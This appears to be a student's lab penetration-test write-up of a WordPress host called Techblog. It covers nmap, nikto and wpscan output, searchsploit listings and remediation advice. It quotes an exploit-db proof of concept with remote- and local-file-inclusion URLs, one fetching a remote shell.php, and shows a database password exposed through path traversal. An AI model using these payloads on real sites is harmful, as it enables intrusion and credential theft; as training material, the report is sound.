# Pentest 10 - Techblog - 3 - 10.14.1.3

## Introduction

## Scanning and Enumerating

```bash
cat _quick_tcp_nmap.txt 
# Nmap 7.94 scan initiated Sat Aug  5 17:02:40 2023 as: nmap -vv --reason -Pn -T4 -sV -sC --version-all -A --osscan-guess -oN /home/kali/reports/10/results/10.14.1.3/scans/_quick_tcp_nmap.txt -oX /home/kali/reports/10/results/10.14.1.3/scans/xml/_quick_tcp_nmap.xml 10.14.1.3
Nmap scan report for 10.14.1.3
Host is up, received user-set (0.14s latency).
Scanned at 2023-08-05 17:02:40 EDT for 60s
Not shown: 989 filtered tcp ports (no-response), 8 filtered tcp ports (host-prohibited)
PORT    STATE SERVICE  REASON         VERSION
22/tcp  open  ssh      syn-ack ttl 63 OpenSSH 6.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 94:21:e2:45:cd:4b:34:4b:19:51:5d:7d:9e:3e:cd:52 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDAO4lMLxorS3tVo2cQRB5HCxGAqHSAY+/DQZRyvYfA4Lhgn/xkaFQb9oyZc8qBo1rhwpPPML0Sg0bXodPp/gGA8nrsfINTy/v2qadq6/1SzwZ3XnA05vF1ohzs6dgev6IUDzFaXlEP4e+Sl0yh4VV+wsdA0BimA8KNoFsGgvrjq6kKxqLy/l1AjlVlCx+2sYjG7v3rKgsLlMb7u9BRevG1im/89KfoSXXJJ0vXIGzcZlrJgq/738mIccreR5p77ozLwBZOpULWOFZbkPVAueJCOJQ48m6tRBQDfLMQqFQKELsFscWshS1hg8QItfuUBhC2HmapJZgaetOb1BYApEPz
|   256 43:d0:e4:7a:ee:00:da:07:2a:79:38:19:fe:99:e4:b0 (ECDSA)
|_ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBMw4dCv6r7BkKGJuMuqtfAsO6cCnVbd5oyXOPe//oPzz/jh+ha6GBTNbpY/2PXZYm1YST0mksM+K0k7sz18eGLI=
80/tcp  open  http     syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
|_http-title: Techblog &#8211; Blogging tech
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-generator: WordPress 4.7.2
443/tcp open  ssl/http syn-ack ttl 63 Apache httpd 2.4.6 ((CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost/organizationalUnitName=SomeOrganizationalUnit
| Issuer: commonName=localhost/organizationName=SomeOrganization/stateOrProvinceName=SomeState/countryName=--/localityName=SomeCity/emailAddress=root@localhost/organizationalUnitName=SomeOrganizationalUnit
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2017-02-16T09:05:01
| Not valid after:  2018-02-16T09:05:01
| MD5:   a393:9a0b:f9e6:cf24:a146:0a2c:7bc5:f5dd
| SHA-1: 3f41:8c90:dcbd:5e50:3719:819d:49a9:f1b8:fd77:7f39
| -----BEGIN CERTIFICATE-----
| MIID3jCCAsagAwIBAgICQHcwDQYJKoZIhvcNAQELBQAwgaMxCzAJBgNVBAYTAi0t
| MRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkwFwYDVQQK
| DBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0aW9uYWxV
| bml0MRIwEAYDVQQDDAlsb2NhbGhvc3QxHTAbBgkqhkiG9w0BCQEWDnJvb3RAbG9j
| YWxob3N0MB4XDTE3MDIxNjA5MDUwMVoXDTE4MDIxNjA5MDUwMVowgaMxCzAJBgNV
| BAYTAi0tMRIwEAYDVQQIDAlTb21lU3RhdGUxETAPBgNVBAcMCFNvbWVDaXR5MRkw
| FwYDVQQKDBBTb21lT3JnYW5pemF0aW9uMR8wHQYDVQQLDBZTb21lT3JnYW5pemF0
| aW9uYWxVbml0MRIwEAYDVQQDDAlsb2NhbGhvc3QxHTAbBgkqhkiG9w0BCQEWDnJv
| b3RAbG9jYWxob3N0MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAu7fX
| NUAsPiBPx1t7/Nef4aTs6O5NIx86waNWACKtK1rZmImQRyZfoTmGOxzI4UJux25n
| PR/ohuYnHirgQleClt4NTkWKhVPo0OMzcoTYKODp68jk/OKtxtIYOIH+WYFIF+tg
| hEfnTvc+wOEZVqZCeyL+/u7V0lEax88jn9vwqbFIy4E78ILL1ks9hrDt6DjDuqXw
| ZeqK5f8UszvFySmSrBtOPK34CIzNtTJbT4lg8DWqWwb6fx5kHclH1dR+olP1tyYe
| n3Zo5AUYUxXOFAQriPDoNMryKQqUun42ary3gC5PSbiv0VHGG3KgVCQuSENdt9t7
| 3YZYAppc9oMx3o61rwIDAQABoxowGDAJBgNVHRMEAjAAMAsGA1UdDwQEAwIF4DAN
| BgkqhkiG9w0BAQsFAAOCAQEABxEetN0PGaQRasTqmXVRQYvA1Xt9gzzO128qHgOv
| SsxUDApleoGfbRSNvxptB3EIio8asin5WHiKesRticajNn5tP3y0h92LyfgpnA9r
| raAFvjiqrmU7WsTz4Mvzr3ar/cB0xXpgqUjc/aPkcvuu3ulYYfms+4HQO86sR5zg
| v4b+31yRcOaf0UXI/1LCMXDRRPYzLxdIGzAYTwH9D+BGyOW3nnKP7DndLQJD/OUu
| Lj8bgX4JXwAs5EKvicbu/L/Ly+9qllM0zXkI3ruz/9MDnrtXW/guaQT2vTAM54Sp
| j2xuFVvDOeG6aOO/dE05azT1aaf4f8Gibe70X1brr94LEg==
|_-----END CERTIFICATE-----
|_http-server-header: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
|_ssl-date: 2023-08-05T21:02:56+00:00; -42s from scanner time.
|_tls-nextprotoneg: <empty>
|_http-title: 400 Bad Request
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose|storage-misc|firewall
Running (JUST GUESSING): Linux 2.6.X|3.X|4.X (97%), Synology DiskStation Manager 5.X (89%), WatchGuard Fireware 11.X (88%)
OS CPE: cpe:/o:linux:linux_kernel:2.6.32 cpe:/o:linux:linux_kernel:3.10 cpe:/o:linux:linux_kernel:4.4 cpe:/a:synology:diskstation_manager:5.2 cpe:/o:watchguard:fireware:11.8 cpe:/o:linux:linux_kernel
OS fingerprint not ideal because: Missing a closed TCP port so results incomplete
Aggressive OS guesses: Linux 2.6.32 (97%), Linux 2.6.32 or 3.10 (97%), Linux 2.6.32 - 2.6.39 (93%), Linux 2.6.32 - 3.0 (92%), Linux 3.2 - 3.8 (91%), Linux 3.4 - 3.10 (91%), Linux 2.6.32 - 3.10 (90%), Linux 2.6.32 - 3.13 (90%), Linux 2.6.39 (90%), Linux 4.4 (90%)
No exact OS matches for host (test conditions non-ideal).
TCP/IP fingerprint:
SCAN(V=7.94%E=4%D=8/5%OT=22%CT=%CU=%PV=Y%G=N%TM=64CEB92C%P=x86_64-pc-linux-gnu)
SEQ(SP=103%GCD=1%ISR=108%TI=Z%II=I%TS=A)
OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B4ST11NW7%O6=M5B4ST11)
WIN(W1=3890%W2=3890%W3=3890%W4=3890%W5=3890%W6=3890)
ECN(R=Y%DF=Y%TG=40%W=3908%O=M5B4NNSNW7%CC=Y%Q=)
T1(R=Y%DF=Y%TG=40%S=O%A=S+%F=AS%RD=0%Q=)
T2(R=N)
T3(R=N)
T4(R=N)
U1(R=N)
IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 37.194 days (since Thu Jun 29 12:23:48 2023)
TCP Sequence Prediction: Difficulty=259 (Good luck!)
IP ID Sequence Generation: All zeros

Host script results:
|_clock-skew: -42s

TRACEROUTE
HOP RTT       ADDRESS
1   142.13 ms 10.14.1.3

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Aug  5 17:03:40 2023 -- 1 IP address (1 host up) scanned in 59.87 seconds
```


|Port|Service|
|---|---|
|22| OpenSSH 6.4 (protocol 2.0) |
|80| Apache httpd 2.4.6, Wordpress 4.7.2|
|443 | Apache 2.4.6| 
|OS | Linux 2.6.32 (97%)| 


### Nikto
```bash
┌──(autorecon)─(kali㉿kali)-[~/…/results/10.14.1.3/scans/tcp80]
└─$ cat tcp_80_http_nikto.txt 
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.14.1.3
+ Target Hostname:    10.14.1.3
+ Target Port:        80
+ Start Time:         2023-08-05 17:03:43 (GMT-4)
---------------------------------------------------------------------------
+ Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
+ /: Retrieved x-powered-by header: PHP/5.4.16.
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: Drupal Link header found with value: <http://10.14.1.3/index.php/wp-json/>; rel="https://api.w.org/". See: https://www.drupal.org/
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ PHP/5.4.16 appears to be outdated (current is at least 8.1.5), PHP 7.4.28 for the 7.4 branch.
+ Apache/2.4.6 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ mod_fcgid/2.3.9 appears to be outdated (current is at least 2.3.10-dev).
+ OpenSSL/1.0.1e-fips appears to be outdated (current is at least 3.0.7). OpenSSL 1.1.1s is current for the 1.x branch and will be supported until Nov 11 2023.
+ /: HTTP TRACE method is active which suggests the host is vulnerable to XST. See: https://owasp.org/www-community/attacks/Cross_Site_Tracing
+ PHP/5.4 - PHP 3/4/5 and 7.0 are End of Life products without support.
+ /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings. See: OSVDB-12184
+ /manual/: Web server manual found.
+ /icons/: Directory indexing found.
+ /manual/images/: Directory indexing found.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /readme.html: This WordPress file reveals the installed version.
+ /wp-links-opml.php: This WordPress script reveals the installed version.
+ /license.txt: License file found may identify site software.
+ /: A Wordpress installation was found.
+ /wp-login.php?action=register: Cookie wordpress_test_cookie created without the httponly flag. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies
+ /wp-content/uploads/: Directory indexing found.
+ /wp-content/uploads/: Wordpress uploads directory is browsable. This may reveal sensitive information.
+ /wp-login.php: Wordpress login found.
```
I was able to get to the login page, but I didn't have any user credentials - the defaults were not successful.  

![image1](/VHL/Reports/010/images/10_1.png)

I checked for available exploits to see what I could find - this yielded a long trail of unsuccessful attempts, but I'm including here to document train of thought and progress. 
![image2](/VHL/Reports/010/images/10_2.png)

Following the hints I was provided, I was able to run `WPscan` and find some available plugins that were being utilized.
Between `nikto` and `wpscan`, I was able to navigate to `site.php`, and determine I could conduct a file traversal.
Reviewing the VHL documentation and my notes, the 7.2 chapter yields:   
```
Web application configuration files
The following files are configuration files for popular web applications, such as content management systems. When a target is running any of these CMS systems you can try to include their configuration files as they often contain sensitive information, such as (root) credentials used to access the database.

WordPress: /var/www/html/wp-config.php
```

![image3](/VHL/Reports/010/images/10_3.png)
![image4](/VHL/Reports/010/images/10_4.png)
![image5](/VHL/Reports/010/images/10_5.png)
![image6](/VHL/Reports/010/images/10_6.png)
![image7](/VHL/Reports/010/images/10_7.png)
![image8](/VHL/Reports/010/images/10_8.png)

```
┌──(autorecon)─(kali㉿kali)-[~/tools]
└─$ wpscan --url 10.14.1.3                                                                                                 130 ⨯
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.18
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.14.1.3/ [10.14.1.3]
[+] Started: Sun Aug 13 11:58:13 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.1e-fips mod_fcgid/2.3.9 PHP/5.4.16
 |  - X-Powered-By: PHP/5.4.16
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://10.14.1.3/xmlrpc.php
 | Found By: Link Tag (Passive Detection)
 | Confidence: 100%
 | Confirmed By: Direct Access (Aggressive Detection), 100% confidence
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://10.14.1.3/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] Upload directory has listing enabled: http://10.14.1.3/wp-content/uploads/
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://10.14.1.3/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 4.7.2 identified (Insecure, released on 2017-01-26).
 | Found By: Rss Generator (Passive Detection)
 |  - http://10.14.1.3/index.php/feed/, <generator>https://wordpress.org/?v=4.7.2</generator>
 |  - http://10.14.1.3/index.php/comments/feed/, <generator>https://wordpress.org/?v=4.7.2</generator>

[+] WordPress theme in use: maggie-lite
 | Location: http://10.14.1.3/wp-content/themes/maggie-lite/
 | Last Updated: 2018-03-11T00:00:00.000Z
 | Readme: http://10.14.1.3/wp-content/themes/maggie-lite/readme.txt
 | [!] The version is out of date, the latest version is 1.0.29
 | Style URL: http://10.14.1.3/wp-content/themes/maggie-lite/style.css?ver=1.0.24
 | Style Name: Maggie Lite
 | Style URI: https://8degreethemes.com/wordpress-themes/maggie-lite/
 | Description: Maggie Lite is clean & modern WordPress magazine theme. It is ideal for newspaper, editorial, online...
 | Author: 8Degree Themes
 | Author URI: https://8degreethemes.com/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.0.24 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://10.14.1.3/wp-content/themes/maggie-lite/style.css?ver=1.0.24, Match: 'Version: 1.0.24'

[+] Enumerating All Plugins (via Passive Methods)
[+] Checking Plugin Versions (via Passive and Aggressive Methods)

[i] Plugin(s) Identified:

[+] wordfence
 | Location: http://10.14.1.3/wp-content/plugins/wordfence/
 | Last Updated: 2023-07-31T13:45:00.000Z
 | [!] The version is out of date, the latest version is 7.10.3
 |
 | Found By: Javascript Var (Passive Detection)
 |
 | Version: 6.3.1 (100% confidence)
 | Found By: Readme - Stable Tag (Aggressive Detection)
 |  - http://10.14.1.3/wp-content/plugins/wordfence/readme.txt
 | Confirmed By: Readme - ChangeLog Section (Aggressive Detection)
 |  - http://10.14.1.3/wp-content/plugins/wordfence/readme.txt

[+] Enumerating Config Backups (via Passive and Aggressive Methods)
 Checking Config Backups - Time: 00:00:06 <==================================================> (137 / 137) 100.00% Time: 00:00:06

[i] No Config Backups Found.

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Sun Aug 13 11:58:33 2023
[+] Requests Done: 172
[+] Cached Requests: 5
[+] Data Sent: 47.321 KB
[+] Data Received: 365.786 KB
[+] Memory used: 267.852 MB
[+] Elapsed time: 00:00:19                        
```

Reviewing the site-import exploit:  
```
┌──(autorecon)─(kali㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]
└─$ cat 39558.txt
# Exploit Title: Wordpress Site Import 1.0.1 | Local and Remote file inclusion
# Exploit Author: Wadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/site-import.1.0.1.zip
# Version: 1.0.1
# Tested on: Xampp on Windows7

[Version Disclosure]
======================================
/wp-content/plugins/site-import/readme.txt
======================================
[PoC]
======================================
Remote File Inclusion == http://localhost/wordpress/wp-content/plugins/site-import/admin/page.php?url=http%3a%2f%2flocalhost%2fshell.php?shell=ls
Local File Inclusion == http://localhost/wordpress/wp-content/plugins/site-import/admin/page.php?url=..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\..\windows\win.ini
======================================                                                                                                                                 
┌──(autorecon)─(kali㉿kali)-[/usr/…/exploitdb/exploits/php/webapps]
└─$ 
```
This yielded the following:

![image9](/VHL/Reports/010/images/10_9.png)  
![image10](/VHL/Reports/010/images/10_10.png)
![image11](/VHL/Reports/010/images/10_11.png)

I was able to successfully login with the following:
```
/** MySQL database username */
define('DB_USER', 'techblog');

/** MySQL database password */
define('DB_PASSWORD', 'z8n#DZf@Sa#X!4@tqG');
```

![image12](/VHL/Reports/010/images/10_12.png)
![image13](/VHL/Reports/010/images/10_13.png)
![image14](/VHL/Reports/010/images/10_14.png)
![image15](/VHL/Reports/010/images/10_15.png)
![image16](/VHL/Reports/010/images/10_16.png)

## Exploitation

### Initial Shell

![image17](/VHL/Reports/010/images/10_17.png)

```
┌──(autorecon)─(kali㉿kali)-[~/tools]
└─$ searchsploit Linux Kernel 3.10 Privilege Escalation
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel (Solaris 10 / < 5.10 138888-01) - Local Privilege Escalation                      | solaris/local/15962.c
Linux Kernel 2.6.19 < 5.9 - 'Netfilter Local Privilege Escalation                              | linux/local/50135.c
Linux Kernel 2.6.x / 3.10.x / 4.14.x (RedHat / Debian / CentOS) (x64) - 'Mutagen Astronomy' Lo | linux_x86-64/local/45516.c
Linux Kernel 3.10.0-514.21.2.el7.x86_64 / 3.10.0-514.26.1.el7.x86_64 (CentOS 7) - SUID Positio | linux/local/42887.c
Linux Kernel 3.14-rc1 < 3.15-rc4 (x64) - Raw Mode PTY Echo Race Condition Privilege Escalation | linux_x86-64/local/33516.c
Linux Kernel 3.4 < 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escala | linux_x86-64/local/31347.c
Linux Kernel 4.8.0 UDEV < 232 - Local Privilege Escalation                                     | linux/local/41886.c
Linux Kernel < 3.16.1 - 'Remount FUSE' Local Privilege Escalation                              | linux/local/34923.c
Linux Kernel < 3.16.39 (Debian 8 x64) - 'inotfiy' Local Privilege Escalation                   | linux_x86-64/local/44302.c
Linux kernel < 4.10.15 - Race Condition Privilege Escalation                                   | linux/local/43345.c
Linux Kernel < 4.11.8 - 'mq_notify: double sock_put()' Local Privilege Escalation              | linux/local/45553.c
Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                  | linux/local/45010.c
Linux Kernel < 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                         | linux/local/44298.c
Linux Kernel < 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalat | linux_x86-64/local/44300.c
Linux Kernel < 4.4.0-83 / < 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR  | linux/local/43418.c
Linux Kernel < 4.4.0/ < 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privileg | linux/local/47169.c
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

┌──(autorecon)─(kali㉿kali)-[~/tools]
└─$ gcc -m32 -static -o exploit 50135.c
In file included from /usr/include/features.h:392,
                 from /usr/include/err.h:22,
                 from 50135.c:60:
/usr/include/features-time64.h:20:10: fatal error: bits/wordsize.h: No such file or directory
   20 | #include <bits/wordsize.h>
      |          ^~~~~~~~~~~~~~~~~
compilation terminated.
```
https://github.com/rapid7/metasploit-framework/issues/10838

First I was trying to search for exploits <= 3.10.0. 
After a bit of trial and error here, I realize, maybe I needed to search for "PRIVILEGE ESCALATION". 
After attempting to compile one on kali that was missing `glibc-headers`, I had to do an `apt-get dist upgrade`.  

I struggled a bit here, but I went back through the notes and was reminded two things:
a) "dirtycow" is not the name of the exploit (which is what I was trying to find in searchsploit)
b) "Dirty COW" affects a large number of Kernel versions including this one (3.10.0). 





![image18](/VHL/Reports/010/images/10_18.png)
![image19](/VHL/Reports/010/images/10_19.png)
![image20](/VHL/Reports/010/images/10_20.png)
![image21](/VHL/Reports/010/images/10_21.png)
```
└─$ searchsploit dirty COW
----------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                 |  Path
----------------------------------------------------------------------------------------------- ---------------------------------
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (1)                         | linux/dos/43199.c
Linux Kernel - 'The Huge Dirty Cow' Overwriting The Huge Zero Page (2)                         | linux/dos/44305.c
Linux Kernel 2.6.22 < 3.9 (x86/x64) - 'Dirty COW /proc/self/mem' Race Condition Privilege Esca | linux/local/40616.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW /proc/self/mem' Race Condition Privilege Escalation (/e | linux/local/40847.cpp
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW PTRACE_POKEDATA' Race Condition (Write Access Method)   | linux/local/40838.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' 'PTRACE_POKEDATA' Race Condition Privilege Escalation  | linux/local/40839.c
Linux Kernel 2.6.22 < 3.9 - 'Dirty COW' /proc/self/mem Race Condition (Write Access Method)    | linux/local/40611.c
----------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```

Unfortunately, I had to reset the host at this point, as the system became unstable after attempting to exploit.

![image22](/VHL/Reports/010/images/10_22.png)
## Remediation

In order of accessibility (and enablement of compromise):
1) Remove / disable / update Site-import to prevent Directory Traversal
2) Don't store credentials in plain text, and accessibly
3) Either upgrade the Linux kernel to mitigate dirty COW, or take the listed (below) administrative actions to prevent exploitation.

   
### Wordpress Site-Import
Vulnerable to Directory Traversal which allowed me to expose wp-config.php containing credentials

### Wordpress Exploit 
### Cleartext / Saved Admin credentials

### Privilege Escalation (Dirty COW)
https://www.redhat.com/en/blog/understanding-and-mitigating-dirty-cow-vulnerability




